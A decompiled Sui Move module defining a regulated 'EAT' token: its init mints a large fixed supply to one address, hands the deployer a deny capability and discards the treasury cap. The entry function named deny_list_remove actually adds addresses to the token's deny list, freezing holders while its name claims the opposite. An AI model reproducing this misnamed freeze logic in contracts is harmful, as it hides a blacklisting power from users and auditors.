module 0xfa3a48e8085d5df411bed5925a4163dad02bb02a32d2b43358d76c5f047ac7b9::eat {
    struct EAT has drop {
        dummy_field: bool,
    }

    entry fun deny_list_remove(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<EAT>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_contains<EAT>(arg0, v1)) {
                0x2::coin::deny_list_add<EAT>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    fun init(arg0: EAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency<EAT>(arg0, 6, b"EAT", b"EAT Token", b"You are good!", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://bafkreiepkmnmiwdxsvsldfefghfwkr2fzyrtaybfdx5nbmsynbdmppqd6q.ipfs.w3s.link/")), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<EAT>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCap<EAT>>(v1, 0x2::tx_context::sender(arg1));
        let v3 = v0;
        0x2::coin::mint_and_transfer<EAT>(&mut v3, 100000000000000, @0x4e18d4e91071236c9d7eb4757311edfbbe2d92953a473792f374a46b6d48c467, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<EAT>>(v3, @0x0);
    }

    // decompiled from Move bytecode v6
}

